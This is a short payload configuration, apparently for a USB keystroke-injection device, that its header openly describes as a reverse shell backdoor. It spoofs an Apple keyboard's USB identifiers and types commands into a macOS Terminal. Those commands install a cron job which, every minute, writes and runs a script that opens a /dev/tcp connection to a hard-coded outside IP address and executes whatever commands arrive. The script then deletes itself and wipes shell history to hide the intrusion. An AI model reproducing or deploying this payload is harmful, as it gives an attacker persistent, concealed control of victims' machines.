# This is a ducky script to create a reverse shell backdoor

USB_VID="0x05ac"        # Vendor ID
USB_PID="0x027b"        # Product ID
USE_RNDIS=true          # If true RNDIS will be enabled
USE_HID=true            # If true HID (keyboard) will be enabled
HID_KEYBOARD_TEST=true  # Enable onKeyboardUp() function
lang="us"               # Keyboard language

function onKeyboardUp()
{

        cat <<- EOF | duckhid

                GUI SPACE
                DELAY 500
                STRING terminal
                DELAY 100
                ENTER
                DELAY 2000
                STRING crontab -l | { cat; echo '* * * * * lsof | grep Mac_Application_Support &>/dev/null; if [[ \\\$? != 0 ]]; then echo "#\\!/bin/bash" > ~/Mac_Application_Support; echo "exec 5<>/dev/tcp/206.189.215.73/3456" >> ~/Mac_Application_Support; echo "cat <&5 | while read line; do \\\$line 2>&5 >&5; done" >> ~/Mac_Application_Support; chmod +x ~/Mac_Application_Support; nohup ~/Mac_Application_Support &>/dev/null &; sleep 1; rm ~/Mac_Application_Support; fi'; } | crontab - && history -c && rm ~/.bash_history && exit
                DELAY 3000
                ENTER
                DELAY 2000
                GUI q

        EOF

}
